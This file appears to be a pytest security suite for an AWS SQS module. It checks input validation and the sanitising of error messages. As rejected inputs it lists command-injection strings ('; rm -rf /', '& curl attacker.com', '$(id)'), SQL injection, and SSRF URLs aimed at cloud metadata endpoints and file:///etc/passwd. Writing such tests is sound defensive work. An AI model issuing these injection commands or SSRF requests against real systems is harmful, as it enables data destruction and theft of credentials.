"""
Comprehensive security audit tests for AWSSQSModule.
Tests queue URL/name injection, SSRF, region injection, message attribute injection, payload security, error disclosure, and configuration security.
"""

import pytest
import json
import asyncio
from unittest.mock import AsyncMock, patch, MagicMock
from src.modules.aws_sqs import AWSSQSModule


# ============================================================================
# 1. QUEUE URL/NAME INJECTION
# ============================================================================


class TestAWSSQSQueueInjection:
    """Test queue URL and name injection vulnerabilities."""

    @pytest.mark.asyncio
    async def test_queue_name_injection_attempts(self):
        """Test that malicious queue names are rejected."""
        injection_attempts = [
            "../../etc/passwd",
            "; rm -rf /",
            "| cat /etc/passwd",
            "& curl attacker.com",
            "`whoami`",
            "$(id)",
            "queue'; DROP TABLE users; --",
            "queue\ninjected",
            "queue\r\ninjected",
            "queue\x00null",
            "queue\tinjected",
        ]

        for malicious_name in injection_attempts:
            config = {
                "module": "aws_sqs",
                "module-config": {"queue_name": malicious_name},
                "connection_details": {"region_name": "us-east-1"},
            }

            try:
                module = AWSSQSModule(config)
                assert False, f"Should reject malicious queue name: {malicious_name}"
            except ValueError:
                # Expected - validation should reject
                pass
            except Exception as e:
                # Should reject with ValueError, not crash
                assert False, f"Unexpected exception for {malicious_name}: {e}"

    @pytest.mark.asyncio
    async def test_queue_url_ssrf_attempts(self):
        """Test SSRF attempts via queue URLs."""
        ssrf_urls = [
            "http://127.0.0.1:8080/queue",
            "http://localhost:8080/queue",
            "http://169.254.169.254/latest/meta-data/",
            "http://192.168.1.1:8080/queue",
            "https://evil.com/queue",
            "file:///etc/passwd",
            "http://[::1]:8080/queue",
        ]

        for ssrf_url in ssrf_urls:
            config = {
                "module": "aws_sqs",
                "module-config": {"queue_url": ssrf_url},
                "connection_details": {"region_name": "us-east-1"},
            }

            try:
                module = AWSSQSModule(config)
                assert False, f"Should reject SSRF queue URL: {ssrf_url}"
            except ValueError:
                # Expected - validation should reject non-AWS URLs
                pass
            except Exception as e:
                # Should reject with ValueError
                assert False, f"Unexpected exception for {ssrf_url}: {e}"

    @pytest.mark.asyncio
    async def test_queue_url_valid_aws_format(self):
        """Test that valid AWS SQS URLs are accepted."""
        valid_urls = [
            "https://sqs.us-east-1.amazonaws.com/123456789012/MyQueue",
            "https://sqs.eu-west-1.amazonaws.com/123456789012/MyQueue",
        ]

        for valid_url in valid_urls:
            config = {
                "module": "aws_sqs",
                "module-config": {"queue_url": valid_url},
                "connection_details": {"region_name": "us-east-1"},
            }

            try:
                module = AWSSQSModule(config)
                assert module._validated_queue == valid_url
            except Exception as e:
                assert (
                    False
                ), f"Should accept valid AWS SQS URL: {valid_url}, error: {e}"

    @pytest.mark.asyncio
    async def test_queue_name_valid_format(self):
        """Test that valid queue names are accepted."""
        valid_names = [
            "MyQueue",
            "my-queue",
            "my_queue",
            "Queue123",
            "a" * 80,  # Max length
        ]

        for valid_name in valid_names:
            config = {
                "module": "aws_sqs",
                "module-config": {"queue_name": valid_name},
                "connection_details": {"region_name": "us-east-1"},
            }

            try:
                module = AWSSQSModule(config)
                assert module._validated_queue == valid_name
            except Exception as e:
                assert (
                    False
                ), f"Should accept valid queue name: {valid_name}, error: {e}"

    @pytest.mark.asyncio
    async def test_queue_name_too_long(self):
        """Test that queue names exceeding max length are rejected."""
        config = {
            "module": "aws_sqs",
            "module-config": {"queue_name": "a" * 81},  # Exceeds 80 char limit
            "connection_details": {"region_name": "us-east-1"},
        }

        try:
            module = AWSSQSModule(config)
            assert False, "Should reject queue name exceeding max length"
        except ValueError as e:
            assert "too long" in str(e).lower()

    @pytest.mark.asyncio
    async def test_queue_name_empty(self):
        """Test that empty queue names are rejected."""
        config = {
            "module": "aws_sqs",
            "module-config": {"queue_name": ""},
            "connection_details": {"region_name": "us-east-1"},
        }

        try:
            module = AWSSQSModule(config)
            assert False, "Should reject empty queue name"
        except ValueError:
            # Expected
            pass

    @pytest.mark.asyncio
    async def test_queue_name_whitespace_only(self):
        """Test that whitespace-only queue names are rejected."""
        config = {
            "module": "aws_sqs",
            "module-config": {"queue_name": "   "},
            "connection_details": {"region_name": "us-east-1"},
        }

        try:
            module = AWSSQSModule(config)
            assert False, "Should reject whitespace-only queue name"
        except ValueError:
            # Expected
            pass

    @pytest.mark.asyncio
    async def test_queue_name_type_validation(self):
        """Test that non-string queue names are rejected."""
        invalid_types = [
            123,
            [],
            {},
            True,
        ]

        for invalid_type in invalid_types:
            config = {
                "module": "aws_sqs",
                "module-config": {"queue_name": invalid_type},
                "connection_details": {"region_name": "us-east-1"},
            }

            try:
                module = AWSSQSModule(config)
                assert False, f"Should reject non-string queue name: {invalid_type}"
            except ValueError:
                # Expected
                pass

        # None is acceptable (will be validated in setup)
        config = {
            "module": "aws_sqs",
            "module-config": {"queue_name": None},
            "connection_details": {"region_name": "us-east-1"},
        }

        try:
            module = AWSSQSModule(config)
            # None is acceptable, but should fail in setup
            await module.setup()
            assert False, "Should require queue name in setup"
        except ValueError as e:
            # Expected - setup should require queue
            assert "queue" in str(e).lower() or "required" in str(e).lower()


# ============================================================================
# 2. SSRF VIA QUEUE URL
# ============================================================================


class TestAWSSQSSSRF:
    """Test SSRF vulnerabilities via queue URLs."""

    @pytest.mark.asyncio
    async def test_queue_url_private_ip_ssrf(self):
        """Test SSRF attempts to private IP addresses."""
        private_ips = [
            "http://127.0.0.1:8080/queue",
            "http://localhost:8080/queue",
            "http://192.168.1.1:8080/queue",
            "http://10.0.0.1:8080/queue",
            "http://172.16.0.1:8080/queue",
        ]

        for private_ip in private_ips:
            config = {
                "module": "aws_sqs",
                "module-config": {"queue_url": private_ip},
                "connection_details": {"region_name": "us-east-1"},
            }

            try:
                module = AWSSQSModule(config)
                assert False, f"Should reject private IP queue URL: {private_ip}"
            except ValueError:
                # Expected - validation should block non-AWS URLs
                pass

    @pytest.mark.asyncio
    async def test_queue_url_metadata_service_ssrf(self):
        """Test SSRF attempts to cloud metadata services."""
        metadata_urls = [
            "http://169.254.169.254/latest/meta-data/",
            "http://169.254.169.254/latest/user-data/",
            "http://[fd00:ec2::254]/latest/meta-data/",
        ]

        for metadata_url in metadata_urls:
            config = {
                "module": "aws_sqs",
                "module-config": {"queue_url": metadata_url},
                "connection_details": {"region_name": "us-east-1"},
            }

            try:
                module = AWSSQSModule(config)
                assert False, f"Should reject metadata service URL: {metadata_url}"
            except ValueError:
                # Expected
                pass

    @pytest.mark.asyncio
    async def test_queue_url_dangerous_schemes(self):
        """Test that dangerous URL schemes are rejected."""
        dangerous_schemes = [
            "file:///etc/passwd",
            "gopher://evil.com",
            "ldap://evil.com",
        ]

        for dangerous_url in dangerous_schemes:
            config = {
                "module": "aws_sqs",
                "module-config": {"queue_url": dangerous_url},
                "connection_details": {"region_name": "us-east-1"},
            }

            try:
                module = AWSSQSModule(config)
                assert False, f"Should reject dangerous scheme: {dangerous_url}"
            except ValueError:
                # Expected
                pass

    @pytest.mark.asyncio
    async def test_queue_url_malformed_aws_url(self):
        """Test that malformed AWS URLs are rejected."""
        malformed_urls = [
            "https://sqs.evil.com/queue",
            "https://evil.amazonaws.com/queue",
            "http://sqs.us-east-1.amazonaws.com/queue",  # HTTP not HTTPS
        ]

        for malformed_url in malformed_urls:
            config = {
                "module": "aws_sqs",
                "module-config": {"queue_url": malformed_url},
                "connection_details": {"region_name": "us-east-1"},
            }

            try:
                module = AWSSQSModule(config)
                assert False, f"Should reject malformed AWS URL: {malformed_url}"
            except ValueError:
                # Expected
                pass


# ============================================================================
# 3. REGION INJECTION
# ============================================================================


class TestAWSSQSRegionInjection:
    """Test region name injection vulnerabilities."""

    @pytest.mark.asyncio
    async def test_region_name_injection_attempts(self):
        """Test that malicious region names are rejected."""
        injection_attempts = [
            "../../etc/passwd",
            "; rm -rf /",
            "us-east-1; cat /etc/passwd",
            "us-east-1\ninjected",
            "us-east-1\x00null",
        ]

        for malicious_region in injection_attempts:
            config = {
                "module": "aws_sqs",
                "module-config": {"queue_name": "MyQueue"},
                "connection_details": {"region_name": malicious_region},
            }

            try:
                module = AWSSQSModule(config)
                await module.setup()
                assert False, f"Should reject malicious region: {malicious_region}"
            except (ValueError, Exception) as e:
                # Expected - validation should reject (may be sanitized as generic Exception)
                error_msg = str(e).lower()
                # Error should be sanitized and not expose the malicious region in detail
                # Accept sanitized errors or validation errors
                assert (
                    "region" in error_msg
                    or "invalid" in error_msg
                    or "sqs" in error_msg
                    or "aws" in error_msg
                    or "error" in error_msg
                    or "processing" in error_msg
                ), f"Error message should indicate rejection: {error_msg}"

    @pytest.mark.asyncio
    async def test_region_name_valid_format(self):
        """Test that valid region names are accepted."""
        valid_regions = [
            "us-east-1",
            "eu-west-1",
            "ap-southeast-1",
        ]

        for valid_region in valid_regions:
            config = {
                "module": "aws_sqs",
                "module-config": {"queue_name": "MyQueue"},
                "connection_details": {"region_name": valid_region},
            }

            try:
                module = AWSSQSModule(config)
                # Should not raise exception during validation
                # (setup will fail without real AWS credentials, but validation should pass)
            except ValueError as e:
                if "region" in str(e).lower():
                    assert (
                        False
                    ), f"Should accept valid region: {valid_region}, error: {e}"

    @pytest.mark.asyncio
    async def test_region_name_type_validation(self):
        """Test that non-string region names are rejected."""
        invalid_types = [
            None,
            123,
            [],
            {},
        ]

        for invalid_type in invalid_types:
            config = {
                "module": "aws_sqs",
                "module-config": {"queue_name": "MyQueue"},
                "connection_details": {"region_name": invalid_type},
            }

            try:
                module = AWSSQSModule(config)
                await module.setup()
                assert False, f"Should reject non-string region: {invalid_type}"
            except (ValueError, Exception) as e:
                # Expected - validation should reject (may be sanitized as generic Exception)
                error_msg = str(e).lower()
                assert (
                    "region" in error_msg
                    or "invalid" in error_msg
                    or "sqs" in error_msg
                    or "aws" in error_msg
                    or "error" in error_msg
                    or "string" in error_msg
                )


# ============================================================================
# 4. MESSAGE ATTRIBUTE INJECTION
# ============================================================================


class TestAWSSQSMessageAttributeInjection:
    """Test message attribute injection vulnerabilities."""

    @pytest.mark.asyncio
    async def test_message_attribute_key_injection(self):
        """Test that malicious message attribute keys are handled safely."""
        config = {
            "module": "aws_sqs",
            "module-config": {"queue_name": "MyQueue"},
            "connection_details": {
                "region_name": "us-east-1",
                "aws_access_key_id": "test_key",
                "aws_secret_access_key": "test_secret",
            },
        }

        module = AWSSQSModule(config)

        # Mock SQS client
        mock_client = MagicMock()
        mock_client.get_queue_url.return_value = {
            "QueueUrl": "https://sqs.us-east-1.amazonaws.com/123456789012/MyQueue"
        }
        module.sqs_client = mock_client

        malicious_keys = [
            "key\ninjected",
            "key\r\ninjected",
            "key\x00null",
            "key\tinjected",
            "../../etc/passwd",
        ]

        for malicious_key in malicious_keys:
            headers = {malicious_key: "value"}
            payload = {"test": "data"}

            try:
                await module.process(payload, headers)
                # Should handle malicious keys safely (may be filtered or sanitized)
                # Check that send_message was called (even if attribute was filtered)
                assert (
                    mock_client.send_message.called or mock_client.get_queue_url.called
                )
            except Exception as e:
                # Should not crash
                error_msg = str(e).lower()
                assert "sqs" in error_msg or "aws" in error_msg or "queue" in error_msg

    @pytest.mark.asyncio
    async def test_message_attribute_value_injection(self):
        """Test that malicious message attribute values are handled safely."""
        config = {
            "module": "aws_sqs",
            "module-config": {"queue_name": "MyQueue"},
            "connection_details": {
                "region_name": "us-east-1",
                "aws_access_key_id": "test_key",
                "aws_secret_access_key": "test_secret",
            },
        }

        module = AWSSQSModule(config)

        # Mock SQS client
        mock_client = MagicMock()
        mock_client.get_queue_url.return_value = {
            "QueueUrl": "https://sqs.us-east-1.amazonaws.com/123456789012/MyQueue"
        }
        module.sqs_client = mock_client

        malicious_values = [
            "value\ninjected",
            "value\r\ninjected",
            "value\x00null",
            "../../etc/passwd",
            "x" * 300,  # Exceeds 256 char limit
        ]

        for malicious_value in malicious_values:
            headers = {"X-Header": malicious_value}
            payload = {"test": "data"}

            try:
                await module.process(payload, headers)
                # Should handle malicious values safely
                # Values exceeding 256 chars should be filtered
                # Check that send_message was called
                assert (
                    mock_client.send_message.called or mock_client.get_queue_url.called
                )
            except Exception as e:
                # Should not crash
                pass

    @pytest.mark.asyncio
    async def test_message_attribute_length_limit(self):
        """Test that message attribute values exceeding 256 chars are filtered."""
        config = {
            "module": "aws_sqs",
            "module-config": {"queue_name": "MyQueue"},
            "connection_details": {
                "region_name": "us-east-1",
                "aws_access_key_id": "test_key",
                "aws_secret_access_key": "test_secret",
            },
        }

        module = AWSSQSModule(config)

        # Mock SQS client
        mock_client = MagicMock()
        mock_client.get_queue_url.return_value = {
            "QueueUrl": "https://sqs.us-east-1.amazonaws.com/123456789012/MyQueue"
        }
        module.sqs_client = mock_client

        # Mock run_in_executor to capture send_message call
        with patch("asyncio.get_event_loop") as mock_loop:
            call_args_capture = []

            async def run_executor_mock(executor, func):
                result = func()
                if hasattr(mock_client, "send_message"):
                    # Capture the call
                    if mock_client.send_message.called:
                        call_args_capture.append(mock_client.send_message.call_args)
                return result

            mock_loop.return_value.run_in_executor = run_executor_mock

            headers = {"X-Header": "x" * 300}  # Exceeds 256 char limit
            payload = {"test": "data"}

            await module.process(payload, headers)

            # Should filter out attributes exceeding 256 chars
            if call_args_capture:
                call_args = call_args_capture[0]
                message_attributes = call_args[1].get("MessageAttributes")
                # Attribute with 300 chars should be filtered out (None means no attributes, or attribute should be <= 256 chars)
                if message_attributes is None:
                    # No attributes (all filtered out) - this is acceptable
                    pass
                elif "X-Header" in message_attributes:
                    # If attribute exists, it should be <= 256 chars
                    attr_value = message_attributes.get("X-Header", {}).get(
                        "StringValue", ""
                    )
                    assert (
                        len(attr_value) <= 256
                    ), f"Attribute value should be <= 256 chars, got {len(attr_value)}"
                else:
                    # Attribute was filtered out - this is correct
                    pass


# ============================================================================
# 5. PAYLOAD SECURITY
# ============================================================================


class TestAWSSQSPayloadSecurity:
    """Test payload security vulnerabilities."""

    @pytest.mark.asyncio
    async def test_circular_reference_in_payload(self):
        """Test that circular references in payload are handled safely."""
        config = {
            "module": "aws_sqs",
            "module-config": {"queue_name": "MyQueue"},
            "connection_details": {
                "region_name": "us-east-1",
                "aws_access_key_id": "test_key",
                "aws_secret_access_key": "test_secret",
            },
        }

        module = AWSSQSModule(config)

        # Mock SQS client
        mock_client = MagicMock()
        mock_client.get_queue_url.return_value = {
            "QueueUrl": "https://sqs.us-east-1.amazonaws.com/123456789012/MyQueue"
        }
        module.sqs_client = mock_client

        # Create circular reference
        payload = {"test": "data"}
        payload["self"] = payload  # Circular reference

        headers = {}

        # Mock run_in_executor
        with patch("asyncio.get_event_loop") as mock_loop:

            async def run_executor_mock(executor, func):
                try:
                    return func()
                except (ValueError, TypeError) as e:
                    # JSON serialization error is expected for circular references
                    raise
                except Exception:
                    raise

            mock_loop.return_value.run_in_executor = run_executor_mock

            try:
                await module.process(payload, headers)
                # JSON serialization should handle circular references (may raise error)
            except (ValueError, TypeError) as e:
                # JSON serialization error is expected for circular references
                assert (
                    "circular" in str(e).lower()
                    or "not serializable" in str(e).lower()
                    or isinstance(e, (ValueError, TypeError))
                )
            except Exception as e:
                # Should not crash with unexpected errors
                pass

    @pytest.mark.asyncio
    async def test_large_payload_dos(self):
        """Test that very large payloads are handled safely."""
        config = {
            "module": "aws_sqs",
            "module-config": {"queue_name": "MyQueue"},
            "connection_details": {
                "region_name": "us-east-1",
                "aws_access_key_id": "test_key",
                "aws_secret_access_key": "test_secret",
            },
        }

        module = AWSSQSModule(config)

        # Mock SQS client
        mock_client = MagicMock()
        mock_client.get_queue_url.return_value = {
            "QueueUrl": "https://sqs.us-east-1.amazonaws.com/123456789012/MyQueue"
        }
        module.sqs_client = mock_client

        # Very large payload (SQS message body limit is 256 KB)
        large_payload = {"data": "x" * 300000}  # ~300 KB

        headers = {}

        # Mock run_in_executor
        with patch("asyncio.get_event_loop") as mock_loop:

            async def run_executor_mock(executor, func):
                return func()

            mock_loop.return_value.run_in_executor = run_executor_mock

            try:
                await module.process(large_payload, headers)
                # Should handle large payload (may fail at AWS level, but shouldn't crash)
                assert (
                    mock_client.send_message.called or mock_client.get_queue_url.called
                )
            except Exception as e:
                # Should not crash, may raise AWS error for oversized message
                error_msg = str(e).lower()
                assert (
                    "sqs" in error_msg
                    or "aws" in error_msg
                    or "message" in error_msg
                    or "size" in error_msg
                )

    @pytest.mark.asyncio
    async def test_deeply_nested_payload(self):
        """Test that deeply nested payloads are handled safely."""
        config = {
            "module": "aws_sqs",
            "module-config": {"queue_name": "MyQueue"},
            "connection_details": {
                "region_name": "us-east-1",
                "aws_access_key_id": "test_key",
                "aws_secret_access_key": "test_secret",
            },
        }

        module = AWSSQSModule(config)

        # Mock SQS client
        mock_client = MagicMock()
        mock_client.get_queue_url.return_value = {
            "QueueUrl": "https://sqs.us-east-1.amazonaws.com/123456789012/MyQueue"
        }
        module.sqs_client = mock_client

        # Deeply nested payload
        nested_payload = {}
        current = nested_payload
        for i in range(100):
            current["nested"] = {}
            current = current["nested"]

        headers = {}

        # Mock run_in_executor
        with patch("asyncio.get_event_loop") as mock_loop:

            async def run_executor_mock(executor, func):
                return func()

            mock_loop.return_value.run_in_executor = run_executor_mock

            try:
                await module.process(nested_payload, headers)
                # Should handle deeply nested payload
                assert (
                    mock_client.send_message.called or mock_client.get_queue_url.called
                )
            except Exception as e:
                # Should not crash
                pass

    @pytest.mark.asyncio
    async def test_non_serializable_payload(self):
        """Test that non-serializable payloads are handled safely."""
        config = {
            "module": "aws_sqs",
            "module-config": {"queue_name": "MyQueue"},
            "connection_details": {
                "region_name": "us-east-1",
                "aws_access_key_id": "test_key",
                "aws_secret_access_key": "test_secret",
            },
        }

        module = AWSSQSModule(config)

        # Mock SQS client
        mock_client = MagicMock()
        mock_client.get_queue_url.return_value = {
            "QueueUrl": "https://sqs.us-east-1.amazonaws.com/123456789012/MyQueue"
        }
        module.sqs_client = mock_client

        # Non-serializable payload (function object)
        def non_serializable():
            pass

        payload = {"func": non_serializable}
        headers = {}

        # Mock run_in_executor
        with patch("asyncio.get_event_loop") as mock_loop:

            async def run_executor_mock(executor, func):
                try:
                    return func()
                except (TypeError, ValueError):
                    raise
                except Exception:
                    raise

            mock_loop.return_value.run_in_executor = run_executor_mock

            try:
                await module.process(payload, headers)
                # Should handle non-serializable payload (may convert to string or raise error)
            except (TypeError, ValueError) as e:
                # JSON serialization error is expected
                assert (
                    "not serializable" in str(e).lower()
                    or "not json serializable" in str(e).lower()
                    or isinstance(e, (TypeError, ValueError))
                )
            except Exception as e:
                # Should not crash with unexpected errors
                pass


# ============================================================================
# 6. ERROR INFORMATION DISCLOSURE
# ============================================================================


class TestAWSSQSErrorDisclosure:
    """Test error information disclosure vulnerabilities."""

    @pytest.mark.asyncio
    async def test_aws_error_sanitization(self):
        """Test that AWS errors don't expose sensitive information."""
        config = {
            "module": "aws_sqs",
            "module-config": {"queue_name": "MyQueue"},
            "connection_details": {
                "region_name": "us-east-1",
                "aws_access_key_id": "AKIAIOSFODNN7EXAMPLE",
                "aws_secret_access_key": "wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY",
            },
        }

        module = AWSSQSModule(config)

        # Mock SQS client to raise error with sensitive info
        mock_client = MagicMock()
        from botocore.exceptions import ClientError

        error_response = {
            "Error": {
                "Code": "InvalidAccessKeyId",
                "Message": "The AWS Access Key Id AKIAIOSFODNN7EXAMPLE you provided does not exist",
            }
        }
        mock_client.get_queue_url.side_effect = ClientError(
            error_response, "GetQueueUrl"
        )
        module.sqs_client = mock_client

        payload = {"test": "data"}
        headers = {}

        # Mock run_in_executor
        with patch("asyncio.get_event_loop") as mock_loop:

            async def run_executor_mock(executor, func):
                try:
                    return func()
                except Exception as e:
                    raise Exception(
                        sanitize_error_message(e, "SQS queue URL retrieval")
                    )

            mock_loop.return_value.run_in_executor = run_executor_mock

            try:
                await module.process(payload, headers)
                assert False, "Should raise exception"
            except Exception as e:
                error_msg = str(e).lower()
                # Should sanitize error message
                # Access key should not be exposed in error
                assert "akiaiosfodnn7example" not in error_msg
                assert (
                    "sqs" in error_msg or "queue" in error_msg or "error" in error_msg
                )

    @pytest.mark.asyncio
    async def test_connection_error_sanitization(self):
        """Test that connection errors are sanitized."""
        config = {
            "module": "aws_sqs",
            "module-config": {"queue_name": "MyQueue"},
            "connection_details": {
                "region_name": "us-east-1",
                "aws_access_key_id": "test_key",
                "aws_secret_access_key": "test_secret",
            },
        }

        try:
            module = AWSSQSModule(config)
            # Mock boto3.client to raise exception with sensitive info
            with patch("boto3.client") as mock_boto3:
                mock_boto3.side_effect = Exception(
                    "Connection failed: aws_access_key_id=AKIAIOSFODNN7EXAMPLE aws_secret_access_key=wJalrXUtnFEMI"
                )

                try:
                    await module.setup()
                    assert False, "Should raise exception"
                except Exception as e:
                    error_msg = str(e).lower()
                    # Should sanitize error message
                    assert "akiaiosfodnn7example" not in error_msg
                    assert "wjalr" not in error_msg
                    assert (
                        "sqs" in error_msg or "aws" in error_msg or "error" in error_msg
                    )
        except Exception as e:
            # Module initialization error
            pass


# ============================================================================
# 7. CONFIGURATION SECURITY
# ============================================================================


class TestAWSSQSConfigurationSecurity:
    """Test configuration security vulnerabilities."""

    @pytest.mark.asyncio
    async def test_config_type_validation(self):
        """Test that invalid configuration types are handled safely."""
        invalid_configs = [
            None,
            "not a dict",
            123,
            [],
        ]

        for invalid_config in invalid_configs:
            try:
                module = AWSSQSModule(invalid_config)
                # Should handle invalid config (may raise AttributeError or TypeError)
            except (TypeError, AttributeError, ValueError):
                # Expected - type validation should reject invalid configs
                pass
            except Exception as e:
                # Should handle gracefully
                pass

    @pytest.mark.asyncio
    async def test_missing_queue_config(self):
        """Test behavior when queue URL/name is missing."""
        config = {
            "module": "aws_sqs",
            "module-config": {},
            "connection_details": {"region_name": "us-east-1"},
        }

        module = AWSSQSModule(config)

        try:
            await module.setup()
            assert False, "Should raise exception when queue is missing"
        except ValueError as e:
            assert "queue" in str(e).lower() or "required" in str(e).lower()

    @pytest.mark.asyncio
    async def test_connection_details_type_validation(self):
        """Test that connection details type validation works."""
        config = {
            "module": "aws_sqs",
            "module-config": {"queue_name": "MyQueue"},
            "connection_details": "not a dict",  # Invalid type
        }

        try:
            module = AWSSQSModule(config)
            await module.setup()
            # Should handle invalid connection_details type
        except (TypeError, AttributeError, ValueError):
            # Expected
            pass
        except Exception as e:
            # Should handle gracefully
            pass


# ============================================================================
# 8. CONCURRENT PROCESSING
# ============================================================================


class TestAWSSQSConcurrentProcessing:
    """Test concurrent processing security."""

    @pytest.mark.asyncio
    async def test_concurrent_message_processing(self):
        """Test that concurrent message processing is handled securely."""
        config = {
            "module": "aws_sqs",
            "module-config": {"queue_name": "MyQueue"},
            "connection_details": {
                "region_name": "us-east-1",
                "aws_access_key_id": "test_key",
                "aws_secret_access_key": "test_secret",
            },
        }

        module = AWSSQSModule(config)

        # Mock SQS client
        mock_client = MagicMock()
        mock_client.get_queue_url.return_value = {
            "QueueUrl": "https://sqs.us-east-1.amazonaws.com/123456789012/MyQueue"
        }
        module.sqs_client = mock_client

        # Mock run_in_executor
        with patch("asyncio.get_event_loop") as mock_loop:

            async def run_executor_mock(executor, func):
                return func()

            mock_loop.return_value.run_in_executor = run_executor_mock

            # Process multiple messages concurrently
            tasks = []
            for i in range(10):
                payload = {"test": f"data_{i}"}
                headers = {"X-Request-ID": f"req_{i}"}
                task = module.process(payload, headers)
                tasks.append(task)

            results = await asyncio.gather(*tasks, return_exceptions=True)

            # All should complete (may have exceptions, but shouldn't crash)
            assert len(results) == 10
            # Check that send_message was called multiple times
            assert mock_client.send_message.call_count >= 1


# ============================================================================
# 9. EDGE CASES
# ============================================================================


class TestAWSSQSEdgeCases:
    """Test edge cases and boundary conditions."""

    @pytest.mark.asyncio
    async def test_empty_payload(self):
        """Test that empty payloads are handled safely."""
        config = {
            "module": "aws_sqs",
            "module-config": {"queue_name": "MyQueue"},
            "connection_details": {
                "region_name": "us-east-1",
                "aws_access_key_id": "test_key",
                "aws_secret_access_key": "test_secret",
            },
        }

        module = AWSSQSModule(config)

        # Mock SQS client
        mock_client = MagicMock()
        mock_client.get_queue_url.return_value = {
            "QueueUrl": "https://sqs.us-east-1.amazonaws.com/123456789012/MyQueue"
        }
        module.sqs_client = mock_client

        # Mock run_in_executor
        with patch("asyncio.get_event_loop") as mock_loop:

            async def run_executor_mock(executor, func):
                return func()

            mock_loop.return_value.run_in_executor = run_executor_mock

            payload = {}
            headers = {}

            await module.process(payload, headers)
            # Should handle empty payload
            assert mock_client.send_message.called

    @pytest.mark.asyncio
    async def test_empty_headers(self):
        """Test that empty headers are handled safely."""
        config = {
            "module": "aws_sqs",
            "module-config": {"queue_name": "MyQueue"},
            "connection_details": {
                "region_name": "us-east-1",
                "aws_access_key_id": "test_key",
                "aws_secret_access_key": "test_secret",
            },
        }

        module = AWSSQSModule(config)

        # Mock SQS client
        mock_client = MagicMock()
        mock_client.get_queue_url.return_value = {
            "QueueUrl": "https://sqs.us-east-1.amazonaws.com/123456789012/MyQueue"
        }
        module.sqs_client = mock_client

        # Mock run_in_executor
        with patch("asyncio.get_event_loop") as mock_loop:

            async def run_executor_mock(executor, func):
                return func()

            mock_loop.return_value.run_in_executor = run_executor_mock

            payload = {"test": "data"}
            headers = {}

            await module.process(payload, headers)
            # Should handle empty headers
            assert mock_client.send_message.called

    @pytest.mark.asyncio
    async def test_non_dict_payload(self):
        """Test that non-dict payloads are handled safely."""
        config = {
            "module": "aws_sqs",
            "module-config": {"queue_name": "MyQueue"},
            "connection_details": {
                "region_name": "us-east-1",
                "aws_access_key_id": "test_key",
                "aws_secret_access_key": "test_secret",
            },
        }

        module = AWSSQSModule(config)

        # Mock SQS client
        mock_client = MagicMock()
        mock_client.get_queue_url.return_value = {
            "QueueUrl": "https://sqs.us-east-1.amazonaws.com/123456789012/MyQueue"
        }
        module.sqs_client = mock_client

        # Mock run_in_executor
        with patch("asyncio.get_event_loop") as mock_loop:

            async def run_executor_mock(executor, func):
                return func()

            mock_loop.return_value.run_in_executor = run_executor_mock

            payload = "string payload"
            headers = {}

            await module.process(payload, headers)
            # Should handle non-dict payload (converted to string)
            assert mock_client.send_message.called
